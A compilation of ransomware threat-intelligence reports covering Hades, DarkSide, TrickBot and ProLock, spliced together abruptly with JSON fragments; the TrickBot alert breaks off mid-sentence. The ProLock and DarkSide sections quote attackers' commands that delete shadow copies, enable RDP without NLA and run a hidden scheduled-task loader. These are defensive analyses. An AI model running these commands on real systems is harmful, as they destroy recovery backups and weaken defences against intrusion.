HADES RANSOMWARE OPERATORS CONTINUE TO\nPROLIFERATE ATTACKS, DEPLOYING NEW VARIANTS ALONG THE WAY.\n\nAccenture Security – Cyber Investigations, Forensic & Response (CIFR), Accenture Cyber\nThreat Intelligence (ACTI)\n\nExecutive Summary\n\nIn March 2021, Accenture Security identified a previously unknown financially\nmotivated threat group using the self-proclaimed Hades ransomware variant in\ncybercrime operations that impacted multiple victims.\nSince the March reporting, additional victims have been targeted in the consumer\ngoods & services, insurance, and manufacturing & distribution industry verticals.\nAccenture security assesses with a moderate-to-high level of confidence that in\naddition to the Hades variant, the threat group has added at least one new\nransomware variant to their arsenal, Phoenix Cryptolocker, possibly to deter\nattribution claims or campaign links.\n\nhttps://www.accenture.com/us-en/blogs/security/ransomware-hades\nhttps://www.accenture.com/us-en/blogs/cyber-defense/unknown-threat-group-using-hades-ransomware\n\n\n2/9\n\nTactics, Techniques and Procedures (TTPs) employed by the threat group have\nremained relatively consistent over time, including significant overlap in intrusion sets\nacross known victims.\nHowever, some unique and destructive actions were observed across intrusions, such\nas targeted enumeration of cloud environments and destruction of cloud-native\nbackups or snapshots.\nAccenture Security assesses with moderate confidence that the threat group does not\noperate under an affiliate-based model or ransomware as a service (RaaS) operation.\nWhile previous industry reporting by Crowdstrike and SecureWorks attribute the\noperations to Evil Corp and Gold Winter respectively, Accenture Security is not yet\nable to confidently make attribution claims based on observed intrusion clusters.\n\nThe information outlined in this blog is based on collection from CIFR incident response\nengagements, threat intelligence insights, Open-Source Intelligence (OSINT), and various\nmedia and industry reports.\n\nThis is a developing story; additional technical analysis of the intrusion clusters, attacker\nTTPs and Indicators of Compromise (IOCs) will be released to the community in a separate\nblog post.\n\n<<< Start >>>\n\nRansomware response and recovery\n\nREAD MORE\n\n<<< End >>>\n\nSummary & timeline update\n\nAccenture Security assesses with a moderate-to-high level of confidence that a previously\nreported unknown threat group is now using multiple ransomware variants in cybercrime\noperations that have impacted at least seven (7) victims. Based on collection sources, the\nthreat group has been in operations since at least December 2020 and has continued to\ntarget victims through May 2021. Accenture Security also analyzed the group's activities in\nthe context of attribution, victimology, and TTPs employed based on collection from industry\n\nhttps://www.crowdstrike.com/blog/hades-ransomware-successor-to-indrik-spiders-wastedlocker/\nhttps://www.secureworks.com/blog/hades-ransomware-operators-use-distinctive-tactics-and-infrastructure\nhttps://acn-marketing-blog.accenture.com/wp-content/uploads/2021/06/Accenture-Security-Ransomeware-105x105-1.jpeg\nhttps://www.accenture.com/us-en/insights/security/ransomware-response-recovery\nhttps://www.accenture.com/us-en/insights/security/ransomware-response-recovery\nhttps://www.accenture.com/us-en/blogs/cyber-defense/unknown-threat-group-using-hades-ransomware\nhttps://www.bleepingcomputer.com/news/security/trucking-giant-forward-air-hit-by-new-hades-ransomware-gang/\n\n\n3/9\n\npublications, OSINT and incident response data. Accenture Security assesses the group's\noperations are well underway, and their activity will likely continue to proliferate into the\nforeseeable future, impacting additional carefully selected victims.\n\nVictimology update\n\nBased on our collection sources, we are currently aware of at least seven (7) victims\nspanning multiple industry verticals. Consistent with previous reporting, all known victims\nare large multi-national organizations with annual revenues exceeding $1 billion USD. The\nprofiles of the known victims continue to be a consistent indicator of Big Game Hunting, with\ntarget selection and deployment methods aimed toward high-value payouts.\n\n<<< Start >>>\n\n<<< End >>>\n\nCommonalities across intrusions\n\nDespite the numerous similarities in the potentially linked intrusion sets described herein,\nthere are very few similarities between the victims themselves beyond geography. This\nincludes few overlaps in industry vertical, political ideology, or public status.\n\nAs previously noted, the most significant commonality between victims is that they all fall\ninto the category of “big game ransomware targets” , large companies with the perceived\nability to pay larger ransoms demanded by the threat actors. \n\n In all cases, the threat actors used a relatively standard toolkit with only minor variations,\nincluding but not limited to the following:\n\nCredential access via VPN and SocGholish malware delivered via a malicious Google\nChrome update were found to be the primary infection vectors across victims.\nAdvanced IP scanner was utilized for reconnaissance.\n\n12\n\nhttps://acn-marketing-blog.accenture.com/wp-content/uploads/2021/06/Ransomeware-targets-724x342-1.png\n\n\n4/9\n\nPSexec was used for lateral movement and deployment of the ransomware.\nThe threat actors also made heavy use of Remote Desktop Protocol (RDP) for lateral\nmovement.\nMimikatz was used for credential access.\nSimilar batch files used to disable Microsoft Windows Defender and other antivirus\nsoftware, stop services and clear even logs.\nThreat actors often operated out of the root of C:ProgramData where several\nexecutables tied to the intrusion set were found.\nConsistent use of Cobalt Strike.\nCommonalities in C2 domains were found across intrusions.\nIn at least two (2) intrusions, targeted destruction of backups prior to encryption.\n7zip utility was used to archive data that was then staged and exfiltrated to an\nattacker-controlled server hosted in Mega[.]nz cloud infrastructure, leveraging the\nMEGAsync utility.\n\nHades ransomware operations\n\nAccenture Security assesses that careful target selection and a unique approach to victim\ncommunication, combined with a “lone wolf” approach, also may explain the relatively low\nnumber of known victims since Hades was first identified publicly in December 2020. Lone\nwolf ransomware groups typically operate outside of the affiliate-based model and don’t\nconsistently participate in RaaS operations. However, this doesn’t necessarily mean they\nare not a well-resourced group in and of themselves. In addition, consistent with analysis\npublished by SecureWorks, the ACTI team did not identify related activity on underground\nforums and criminal marketplaces, further supporting our assessment.\n\nBased on updated intrusion data from incident response engagements, the operators tailor\ntheir tactics and tooling to carefully selected targets and run a more “hands on keyboard”\noperation to inflict maximum damage and higher payouts. This includes multi-million-dollar\n(USD) ransom demands, and in at least two (2) instances, successful payment. However,\nwhile portions of each intrusion chain may seem “novel” in nature, their approach suggests\na moderate level of operational and technical sophistication, as the operators leverage a\nmostly standard toolkit and often use “noisy” approaches for reconnaissance. In at least one\ninstance, the targeted organization successfully deterred the attack before impact, so the\nintended action on objectives are unknown.\n\nCompromise Activity & Detection Opportunities\n\nInitial Access\n The primary methods for initial access into the victim’s network includes internet-facing\n\nsystems via Remote Desktop Protocol (RDP) or Virtual Private Network (VPN) using\nlegitimate credentials, as well as SocGholish malware delivered via fake Chrome browser\nupdates.\n\nhttps://www.secureworks.com/blog/hades-ransomware-operators-use-distinctive-tactics-and-infrastructure\nhttps://www.bleepingcomputer.com/news/security/trucking-giant-forward-air-hit-by-new-hades-ransomware-gang/\nhttps://www.secureworks.com/blog/hades-ransomware-operators-use-distinctive-tactics-and-infrastructure\n\n\n5/9\n\nPersistence\nThe use of legitimate credentials, service creation, and distribution of Command and\nControl (C2) beacons across victim environments through the use of Cobalt Strike and\nEmpire, seem to be the predominant approach used by the threat group to further their\nfoothold and maintain persistence.\nIn addition, consistent with previous reporting, the threat actors operated out of the root of\nC:ProgramData where several executables tied to the intrusion set were found.\n\nPrivilege Escalation\nCredential harvesting and subsequent privilege escalation achieved through the use of\ntooling to include mimikatz and manual enumeration of credentials found within files.\n\nDefense Evasion\nImpeding defenses was achieved through use of domain administrator credentials and\nincludes the following:\n\nBatch script that leverages wevtutil.exe to clear event logs on impacted hosts\nDisabling Anti-Virus (AV) products on endpoints\nModification of GPO to disable windows audit logging\nManually disabling Endpoint Detection & Response (EDR) tools and prevention\npolicies through the user interface\n\nDiscovery\nObserved multiple methods for internal network reconnaissance, including various\nreconnaissance scripts and tools such as Advanced Port Scanner used to collect network,\nhost, and domain information.\n\nLateral Movement\nLateral movement accomplished via compromised accounts obtained during internal\nreconnaissance activities. Remote Desktop Protocol (RDP) and PSexec were also\nleveraged for host-to-host lateral movement.\n\nIn one incident, the threat actor installed a custom build of Chrome.exe and leveraged the\nnative browser capabilities to manually target the victim’s cloud environments. This activity\nincluded enumeration of high-value accounts and targeted destruction of data and backups\nthrough the cloud management console.\n\nIn addition, the attempted use of KeeThief for lateral movement was observed. This tool is\noften used by threat actors to abuse credentials stored in KeePass databases. Specifically,\nthreat actors deployed an instance of KeeThief.ps1—an open-source PowerShell package\nwritten in 2016 designed to compromise credentials stored in memory on a system with an\nopen KeePass database.\n\nhttps://attack.mitre.org/software/S0154/\nhttps://attack.mitre.org/software/S0363/\n\n\n6/9\n\nCommand and Control\nIn most of the recent incidents, the threat actors utilized the ubiquitous Cobalt Strike post-\nexploitation framework for command and control within the impacted environments with at\nleast two (2) external beacons per environment. Command and control was also\nestablished using remote manipulator system (RMS).\n\nExfiltration & Impact\nPrior to deploying ransomware, the unknown threat group has employed the 7zip utility to\narchive data that was then staged and exfiltrated to an attacker-controlled server hosted in\nMega[.]nz cloud infrastructure, leveraging the MEGAsync utility. In addition to data theft,\nactors deploy ransomware with PSexec to encrypt files identified on the victim network. The\noperators leverage this approach for \"double-extortion\" tactics.\n\nMitigation recommendations\n\nEnsure a robust crisis management and incident response plan are in place in the\nevent of a data breach or ransomware incident.\nConsider developing continuity of operations plans (COOP) that account for\nransomware or wiper attacks that can spread across the business.\nEmploy a resilient backup strategy and architecture using a “no-silo” approach.\nAvoid opening or downloading suspicious links from external sources until confirming\nlegitimacy.\nMaintain best practices against ransomware, such as patching, updating anti-virus\nsoftware, implementing strict network egress policies, and using application\nwhitelisting where feasible.\nInstall and update anti-virus software to proactively identify and protect against\nmalware.\nDeploy Endpoint Detection and Response (EDR) across the environment, targeting at\nleast 90% workload visibility.\nEmploy a strong corporate password policy.\nUse MFA where possible for authenticating corporate accounts to include remote\naccess mechanisms and security tools. Admin accounts should be cross-platform\nMFA enforced.\nSecure Remote Desktop Protocol (RDP) connections with complex passwords, virtual\nprivate networks (VPNs) and Network Level Authentication (NLA), if RDP connections\nmust be used.\nPatch infrastructure to the highest available level, as threat actors are often better\nable to exploit older systems with existing vulnerabilities.\nEncrypt data-at-rest where possible and protect related keys and technology.\nDo not store credentials in files and scripts on shared locations.\nClose password management applications after use.\nWhere possible, deny caching of credentials in memory (e.g., Credential Guard).\n\n3\n\nhttps://www.accenture.com/us-en/blogs/cyber-defense/ransomware-resilience-rebuild-in-hours\n\n\n7/9\n\nHunt for attacker TTPs to proactively detect and respond to a ransomware attack in\norder to mitigate impact. \n\nMITRE ATT&CK techniques observed\n\nTactic Technique\n\nInitial access T1133: External Remote Services\n T1078: Valid Accounts\n\n T1189: Drive-by Compromise\n\nExecution T1059: Command and Scripting Interpreter\n T1086: PowerShell\n\n T1035: Service Execution\n\nPersistence T1078: Valid Accounts \nT1050: New Service\n\nPrivilege escalation T1055: Process Injection\n T1078: Valid Accounts\n\nDefense Evasion T1078: Valid Accounts \nT1036: Masquerading \n\n T1027: Obfuscated Files or Information \n T1070: Indicator Removal on a Host \n\n T1562: Impair Defenses\n\nCredential Access T1110: Brute Force\n T1003: Credential Dumping\n\nDiscovery T1083: File and Directory Discovery \n T1082: System Information Discovery \n\n T1087: Account Discovery \n T1482: Domain Trust Discovery \n\n T1135: Network Share Discovery \n T1069: Permission Groups Discovery \n\n T1018: Remote System Discovery \n T1016: System Network Configuration Discovery\n\nLateral Movement T1076: Remote Desktop Protocol\n T1028: Windows Remote Management\n\nCollection T1005: Data from Local System \n T1039: Data from Network Shared Drive\n\nCommand & Control T1043: Commonly Used Port\n T1105: Remote File Copy\n\n T1071: Standard Application Layer Protocol\n\nExfiltration T1002: Data Compressed \n T1048: Exfiltration Over Alternative Protocol\n\nhttps://attack.mitre.org/\n\n\n8/9\n\nImpact T1486: Data Encrypted for Impact\n T1489: Service Stop\n\nIf you have an incident or need additional information on ways to detect and respond to\ncyberthreats, contact a member of our CIFR team 24/7/365 by phone 888-RISK-411 or\nemail CIFR.hotline@accenture.com\n\nhttps://arstechnica.com/information-technology/2019/10/fbi-warns-of-major-ransomware-\nattacks-as-criminals-go-big-game-hunting/ https://www.ic3.gov/Media/Y2019/PSA191002 \n\n https://malpedia.caad.fkie.fraunhofer.de/details/win.rms\n\nAccenture Security\n\nAccenture Security is a leading provider of end-to-end cybersecurity services, including\nadvanced cyber defense, applied cybersecurity solutions and managed security operations.\nWe bring security innovation, coupled with global scale and a worldwide delivery capability\nthrough our network of Advanced Technology and Intelligent Operations centers.

      "plain_text": "1/8\n\nSeptember 22, 2020\n\nDarkSide: The new ransomware group behind highly\ntargeted attacks\n\ndigitalshadows.com/blog-and-research/darkside-the-new-ransomware-group-behind-highly-targeted-attacks/\n\nWe’ve recently observed the emergence of a new ransomware operation named DarkSide.\nThe nuance of the operation includes corporate-like methods and customized ransomware\nexecutables, which have made headlines. When it comes to analyzing new ransomware\ncampaigns, one might ask, “how innovative is this threat compared to previous ones?” Well,\nDarkSide is no different from its counterparts but is indeed the latest representation of the\nrising Ransomware-as-a-Corporation (RaaC) trend. Cybercriminals have seen their revenues\nsteadily increase in the last years, making the ransomware market extremely prolific.\nConsequently, we’ve observed frequent attempts from threat actors to upscale their\noperations’ external appearance to improve their reliability and reputation.\n\nFigure 1: DarkSide threat actor profile in Digital Shadows’ client portal\nIn the past month, Digital Shadows has been closely monitoring DarkSide, owing to their\nrecent operation premiere and the interesting methods they utilize throughout their\ncampaign. Since the threat intelligence nerds at Digital Shadows find this new operation so\nfascinating, we wanted to create a blog to detail our findings. \n\n \nWith that said, come with us to the DarkSide (see what we did there?) to get the skinny on\nour recent discoveries.\n\nBringing DarkSide to light\n\nhttps://www.digitalshadows.com/blog-and-research/darkside-the-new-ransomware-group-behind-highly-targeted-attacks/\nhttps://www.forbes.com/sites/daveywinder/2020/08/23/beware-of-the-dark-side-a-sinister-new-1-million-cybersecurity-threat-darkside-ransomware/#1640488020e9\n\n\n2/8\n\nThe DarkSide operation is hardly innovating in terms of tactics, techniques, and procedures\n(TTPs) used by other threat actors. The group shares its methods with infamous names like\nDoppelPaymer, Sodinokibi, Maze, and NetWalker. Many researchers that have analyzed the\nDarkSide ransomware agree that there are significant overlaps between this operation and\nthose mentioned above. What, then, makes DarkSide particularly interesting? The answer is\nthreefold:\n\n1. The group has a highly targeted approach to targeting their victims\n2. Custom ransomware executables are carefully prepared for each target \n3. There is a corporate-like method of communication throughout their attacks \n\nThe group behind DarkSide announced its new ransomware operation via a press release on\ntheir Tor domain in August 2020. Up until this point, some researchers have claimed that the\ngroup has earned over one million USD; however, Digital Shadows cannot corroborate a\ndefinite figure at the time of this report. Possibly in an attempt to underline their experience,\nthey made a point to clarify that the DarkSide operation isn’t their first criminal experience;\nthe campaign was developed to refine existing products into the ultimate ransomware tool.\n\nFigure 2: DarkSide press release announcing a new ransomware campaign\nThe press release stated several ethical principles that guide the group’s decision process\nregarding their potential targets; they claim that the DarkSide operation will never target\ncritical and vulnerable bodies such as schools, hospitals, or even governments. We’ve seen\nother groups claim to stay away from specific sectors (ahem… Maze); however, a recently\nunattributed ransomware attack, which targeted Duesseldorf University Hospital, may have\n\nhttps://www.nytimes.com/2020/09/18/world/europe/cyber-attack-germany-ransomeware-death.html\n\n\n3/8\n\ninadvertently caused a woman to lose her life. With these tragic concerns in mind, we’ll see if\nthey stick to their plan. To go even further, the group behind DarkSide states their intent to\nselect their targets based on their financial revenue. This method implies that a ransom price\nis modeled around the victim organization’s net income.\n\nThe operators behind DarkSide harvest the clear text data from their victim’s server before\nencrypting it and requesting a ransom. The stolen data is then uploaded to DarkSide’s leak\nwebsite, which serves as a powerful extortion tool for the threat group. The targeted\ncompany risks sensitive data loss after a successful attack, and not to mention, a public\nbreach can severely damage an organization’s reputation. If this tactic sounds familiar to\nyou, you’re right on the money – we’ve been closely following the pay-or-get-breached trend\nsince late 2019. \n\nFigure 3: Digital Shadows intelligence alert about an organization affected by DarkSide\n\nhttps://www.bleepingcomputer.com/news/security/darkside-new-targeted-ransomware-demands-million-dollar-ransoms/\nhttps://www.digitalshadows.com/blog-and-research/ransomware-trends-in-q2-how-threat-intelligence-helps/\n\n\n4/8\n\nFigure 4: DarkSide exfiltration and encryption claims on their dark website\n\nThey’re only interested in stealing from the rich\n\nAs we mentioned earlier, other ransomware operators have claimed to remove specific\nsectors from their attack itinerary. DarkSide’s claim to avoid attacking companies within the\neducation, healthcare, and government sectors can appear professional and respectable.\nNonetheless, some promises are broken, and it is yet to be seen whether DarkSide will\nmaintain its stated intentions. \n\nDarkSide has additionally claimed that they choose their targets and determine a suitable\nransom based on an organization’s financial revenue. It’s unconfirmed where DarkSide\nsources their organizational finance information from; however, Digital Shadows has found\nthat, like many other ransomware operators, they may leverage relevant details from\nZoomInfo. \n\nUpping the ante with customized ransomware executables\n\nDarkSide’s operators customize the ransomware executable for the specific company they\nare attacking, indicating that they customize each attack for maximum effectiveness. The\nransomware executes a PowerShell command that deletes Shadow Volume Copies on the\nsystem. DarkSide then proceeds to terminate various databases, applications, and mail\nclients to prepare for encryption. However, the following processes are avoided:\n\nVmcompute.exe\nVmms.exe\nVmwp.exe\n\nhttps://www.digitalshadows.com/blog-and-research/not-another-ransomware-blog-initial-access-brokers-and-their-role/\n\n\n5/8\n\nSvchost.exe\nTeamViewer.exe\nExplorer.exe\n\nAlthough unconfirmed, it is realistically possible that the operators use TeamViewer for\nremote access to computers, as it is rare that this process would be avoided.\n\nEach customized executable includes a personalized ransom note, which consists of the\namount of data that was stolen, the type of data, and a link to the data on the group’s data\nleak site, where victims’ information is leaked if a ransom demand is not met. While the site\nonly references one compromised organization at the time of this blog, we plan to keep an\neye on this group. In the meantime, we have listed DarkSide’s current indicators of\ncompromise (IoCs) and their associated MITRE ATT&CK techniques at the end of this blog. \n\nPress releases make it look more professional, right?\n\nDarkSide attempts to build trust with the victim and the other actors involved by leveraging\nprofessional communication methods. Over time, we have found that trust plays a pivotal\nrole in the cybercriminal world and often determines the possibilities of an entity’s growth and\nexpansion. For example, the English-language marketplace, Empire, had long represented a\ntrust stronghold on the dark web, favoring its establishment in the underground scene – until\nrecently, when rumors of a possible exit scam started to circulate and gain increasing\ntraction.\n\nThe use of a press release to announce a new ransomware operation is a symbol of the\nthreat actor’s intentions and maintains a dual-use:\n\n1. Usually, only corporations and institutions use press releases; they project the\nimpression of dealing with a professional body. In this case, a press release may\nconvince the victim to trust the threat actor and pay the requested ransom. \n\n2. Press releases attract media attention and ultimately weaponize stolen data, leading to\nsevere reputational damage to a targeted organization. \n\nThis operation isn’t the first time a threat group has used a press release to communicate its\nlatest operations or threaten a victim. Many of us remember the campaigns conducted by\n“thedarkoverlord” in 2016 and 2017, which leveraged press releases in the wake of their\nattacks. Even more recently, in May 2020, REvil ransomware operators posted press\nreleases to pressure their victims, which overtly named the compromised organizations and\nclaimed to double their ransoms.\n\nhttps://www.digitalshadows.com/blog-and-research/cybercriminal-underground-rocked-by-empires-apparent-exit-scam/\nhttps://www.digitalshadows.com/blog-and-research/thedarkoverlord-losing-his-patients/\n\n\n6/8\n\nFigure 5: REvil ransomware operators’ press release\n\nLooking forward: Ransomware, Inc.\n\nAlthough this operation displays a unique combination of tactics, communication, and ethical\nclaims, DarkSide merely seems to be the latest product belonging to the growing trend of\nransomware professionalization. \n\nAs RaaC continues to remain a popular method due to its rewarding financial return, we plan\nto see new threat groups with differing technical capabilities entering the ransomware\nThunderdome. Whether or not they’ll succeed in breaking the mold – only time will tell. While\nthe cyber threat landscape can be unpredictable and volatile, a trend is a trend, and we will\ncontinue to monitor the cybercriminal bandwagon closely. \n\nhttps://www.digitalshadows.com/blog-and-research/ransomware-trends-in-q2-how-threat-intelligence-helps/\n\n\n7/8\n\nIndicators of Compromise (IoCs)\n\nMD5: 1a1ea6418811d0dc0b4eea66f0d348f0\n\nMD5: 25bb5ae5bb6a2201e980a590ef6be561\n\nSHA256: 9cee5522a7ca2bfca7cd3d9daba23e9a30deb6205f56c12045839075f7627297\n\nFILENAME: acer.exe\n\nSHA1: d1dfe82775c1d698dd7861d6dfa1352a74551d35\n\nMD5: f87a2e1c3d148a67eaeb696b1ab69133\n\nFILEPATH: Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\n\nFILENAME: README.[victim’s_ID].TXT\n\nFILENAME: Win32 EXE\n\nMITRE ATT&CK Techniques\n\nValid Accounts (T1078)\n\nPowerShell (T1086)\n\nSystem Services: Service Execution (T1569)\n\nAccount Manipulation (T1098)\n\nProcess Injection: Dynamic-link Library Injection (T1055)\n\nAccount Discovery (T1087)\n\nAbuse Elevation Control Mechanism: Bypass User Access Control (T1548)\n\nFile Permissions Modification (T1222)\n\nData Encrypted for Impact (T1486)\n\nInhibit System Recovery (T1490)\n\nSystem Information Discovery (T1082)\n\nProcess Discovery (T1057)\n\nScreen Capture (T1113)\n\nCompile After Delivery (T1500)\n\n\n\n8/8\n\nService Execution (T1035)\n\nAccount Manipulation (T1098)\n\nCredentials in Registry (T1214)\n\nTags: Cyber Threats / DarkSide / Ransomware\n\nhttps://www.digitalshadows.com/blog-and-research/tag/cyber-threats/\nhttps://www.digitalshadows.com/blog-and-research/tag/darkside/\nhttps://www.digitalshadows.com/blog-and-research/tag/ransomware/",

      "plain_text": "1/7\n\nAlert (AA21-076A)\nus-cert.cisa.gov/ncas/alerts/aa21-076a\n\nSummary\n\nThis Joint Cybersecurity Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®)\nframework, Version 8. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.\n\nThe Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) have observed\ncontinued targeting through spearphishing campaigns using TrickBot malware in North America. A sophisticated group of\ncybercrime actors is luring victims, via phishing emails, with a traffic infringement phishing scheme to download TrickBot.\n\nTrickBot—first identified in 2016—is a Trojan developed and operated by a sophisticated group of cybercrime actors.\nOriginally designed as a banking Trojan to steal financial data, TrickBot has evolved into highly modular, multi-stage malware\nthat provides its operators a full suite of tools to conduct a myriad of illegal cyber activities.\n\nTo secure against TrickBot, CISA and FBI recommend implementing the mitigation measures described in this Joint\nCybersecurity Advisory, which include blocking suspicious Internet Protocol addresses, using antivirus software, and\nproviding social engineering and phishing training to employees.\n\nClick here for a PDF version of this report.\n\nTechnical Details\n\nTrickBot is an advanced Trojan that malicious actors spread primarily by spearphishing campaigns using tailored emails that\ncontain malicious attachments or links, which—if enabled—execute malware (Phishing: Spearphishing Attachment\n[T1566.001], Phishing: Spearphishing Link [T1566.002]). CISA and FBI are aware of recent attacks that use phishing emails,\nclaiming to contain proof of a traffic violation, to steal sensitive information. The phishing emails contain links that redirect to a\nwebsite hosted on a compromised server that prompts the victim to click on photo proof of their traffic violation. (User\nExecution: Malicious Link [T1204.001], User Execution: Malicious File [T1204.002]). In clicking the photo, the victim\nunknowingly downloads a malicious JavaScript file that, when opened, automatically communicates with the malicious\nactor’s command and control (C2) server to download TrickBot to the victim’s system (Command and Scripting Interpreter:\nJavaScript [T1059.007]).\n\nAttackers can use TrickBot to:\n\nDrop other malware, such as Ryuk and Conti ransomware, or\n\nTrickBot uses person-in-the-browser attacks to steal information, such as login credentials (Man in the Browser [T1185]).\nAdditionally, some of TrickBot’s modules spread the malware laterally across a network by abusing the Server Message\nBlock (SMB) Protocol. TrickBot operators have a toolset capable of spanning the entirety of the MITRE ATT&CK framework,\nfrom actively or passively gathering information that can be used to support targeting (Reconnaissance [TA0043]), to trying to\nmanipulate, interrupt, or destroy systems and data (Impact [TA0040]).\n\nTrickBot is capable of data exfiltration over a hardcoded C2 server, cryptomining, and host enumeration (e.g.,\nreconnaissance of Unified Extensible Firmware Interface or Basic Input/Output System [UEFI/BIOS] firmware) (Exfiltration\nOver C2 Channel [T1041], Resource Hijacking [T1496], System Information Discovery.[2] For host enumeration, operators\ndeliver TrickBot in modules containing a configuration file with specific tasks.\n\nFigure 1 lays out TrickBot’s use of enterprise

The group's first big attack – that we know\nof, at least – happened at the end of April, when they successfully attacked Diebold Nixdorf -\none of the major ATM providers.\n\nIn this post I'll tell you all you need to know about the new player's main tactics, techniques\nand procedures (TTPs). After, I give a complete outline of the MITRE ATT&CK mapping as it\npertains to ProLock. \nInitial Access\n\nProLock operators used two main vectors of initial access: QakBot (Qbot) and unprotected\nRemote Desktop Protocol (RDP)-servers with weak credentials.\n\nThe latter is a fairly common technique among ransomware operators. This kind of access is\nusually bought from a third party but may be obtained by group members as well.\n\nThe more interesting initial access vector is QakBot, a trojan that was at one point affiliated\nwith the MegaCortex ransomware family.\n\nTypically, QakBot is distributed via phishing campaigns. Phishing emails may contain\nattachments of weaponized Microsoft Office documents or just links to such documents that\nare located on cloud storage – Microsoft OneDrive, for example.\n\nQakBot is also known to be loaded by Emotet, a trojan notorious for its connection with Ryuk\noperators. \n\nExecution\n\nOnce weaponized document is downloaded and opened by the victim, malicious macros is\nenabled, PowerShell is launched and used to download and run QakBot payload from the C2\nserver.\n\nIt's important to note here that the same can be said about ProLock: the payload is extracted\nfrom a BMP or JPG file, and is loaded into memory with PowerShell. In some cases, a\nscheduled task is used to run PowerShell: \n\nschtasks.exe /CREATE /XML C:\\Programdata\\WinMgr.xml /tn WinMgr \nschtasks.exe /RUN /tn WinMgr \ndel C:\\Programdata\\WinMgr.xml \ndel C:\\Programdata\\run.bat\n\nFigure 1: Batch script \n\nhttps://krebsonsecurity.com/2020/05/ransomware-hit-atm-giant-diebold-nixdorf/\n\n\n3/7\n\nPersistence\n\nIn case of RDP access, valid accounts are used to gain persistence in the network. QakBot,\non the other hand, uses multiple persistence mechanisms – most often Run keys and\nscheduled tasks: \n\nFigure 2: Qakbot gained persistence via Run key \n\nIn some cases, startup folders are also used: a shortcut is placed in the folder that points to\nthe loader. \n\n \nDefense Evasion\n\nQBot has a neat trick that lets it avoid detection: it checks for the newest version of itself, and\nreplaces the current version with the new one. Executable files are signed with a stolen or\nfake signature. The initial payload, downloaded by PowerShell, is stored on the server with a\nPNG extension. What's more, is that it's replaced with the legitimate file calc.exe after\nexecution.\n\nTo evade detection, QakBot also uses explorer.exe to execute a process injection\ntechnique.\n\nAs already mentioned, the ProLock payload is hidden inside a BMP or JPG file and may be\nconsidered a defense evasion technique as well. \n\n \nCredential Access\n\nQakBot has keylogging capabilities but is also able to download and run additional scripts\nlike Invoke-Mimikatz, a PowerShell version of the notorious Mimikatz. This enables the\nadversary to employ the credential dumping technique. \n\n \nDiscovery\n\nOnce privileged credentials are obtained, ProLock operators start network discovery\nactivities. They include, but are not limited to, port scanning and Active Directory\nreconnaissance.\n\nIn addition to a wide variety of scripts, attackers use AdFind – another popular tool used by\nmany ransomware groups – to query Active Directory. \n\n \nLateral Movement\n\n\n\n4/7\n\nMany adversaries favor RDP to move laterally across networks, and ProLock is no\nexception. Attackers even have batch scripts in their arsenals to enable RDP access on the\ntarget hosts: \n\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v \n\"fDenyTSConnections\" /t REG_DWORD /d 0 /f \nnetsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes \nreg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" \n/v \"UserAuthentication\" /t REG_DWORD /d 0 /f\n\nFigure 3: A batch script for enabling RDP \n\nFor remote script execution, ProLock operators use PsExec from Sysinternals Suite, another\ncommon tool.\n\nTo run ProLock on hosts, attackers used WMIC – a command line interface for Windows\nManagement Instrumentation – which is also becoming increasingly popular among\nransomware operators. \n\nCollection\n\nJust like many other groups, ProLock operators collect data from compromised networks to\nimprove their chances of fulfilling their ransom demands. Prior to exfiltration, collected data is\narchived with 7Zip. \n\nExfiltration\n\nFor exfiltration, ProLock operators use Rclone, a command line tool capable of synching\nfiles to and from different cloud storage providers, such as OneDrive, Google Drive, Mega,\netc. The executable is always renamed to resemble legitimate system binaries.\n\nUnlike their peers, though, ProLock operators still don't have a website where they publish\nexfiltrated data from companies that refuse to pay the ransom. \n\nImpact\n\nOnce the data is exfiltrated, the group deploys ProLock enterprise-wide. PowerShell is used\nto extract the binary from a PNG or a JPG file and inject it into the memory: \n\n\n\n5/7\n\nFigure 4: PowerShell script \n\nFirst, ProLock kills processes from embedded list (what's interesting is that it uses only six\nletters from the process name, like \"winwor\") and stops services, including security-related\nones like CSFalconService (CrowdStrike Falcon), via the net stop command.\n\nThen, like many other ransomware families, it uses vssadmin to remove Volume Shadow\nCopies and limit their size, so no new copies are created: \n\n \nvssadmin.exe delete shadows /all /quiet \nvssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB \nvssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=unbounded\n\nFigure 5: Removing Volume Shadow Copies \n\nProLock adds .proLock, .pr0Lock or .proL0ck extension to each encrypted file, and drops\n[HOW TO RECOVER FILES].TXT to each folder – a file with instructions on how to decrypt\nfiles, including the link to the website, where the victim should enter the unique ID and get\npayment information: \n\n \n\n\n\n6/7\n\nFigure 6: ProLock Ransom Note\n \n\nEach ProLock sample has an embedded ransom amount – in this case it was 35 Bitcoin, or\napproximately $312 000. \n\n \nSummary\n\nAs you can see, ProLock uses many similar techniques as other ransomware operators to\nachieve their goals. At the same time, however, the group does have its own unique\napproach. With more and more cybercrime groups showing interest in enterprise\nransomware deployment campaigns, some operators may be involved in deploying different\nransomware families, so we'll likely see more overlaps in tactics, techniques and procedures.\n\nMITRE ATT&CK Mapping\n\nThe global pandemic has forced many people to work from home. Transitioning employees\nto remote work creates additional cybersecurity risks. Many cybercriminals are exploiting the\ncrisis and ransomeware operators are not an exception. INTERPOL's Cybercrime team\ntracked a surge in ransomware attacks amid COVID19. Group-IB DFIR experts prepared 10\nRecommendations for preventing ransomware attacks accessible here.\n\nhttps://www.group-ib.com/landing/stay-safe.html#10-Recommendations\n\n\n7/7\n\nBe confident in the security of your company\n\nFor more than 17 years Group-IB's DFIR Lab has investigated cybercrimes around the world.\nDuring this time, we've clocked in more than 60,000 hours of incident response to the most\ncomplex cyberattacks.\n\nIf our experience has taught us anything, it's that a professional response to ransomware is\nextremely important.

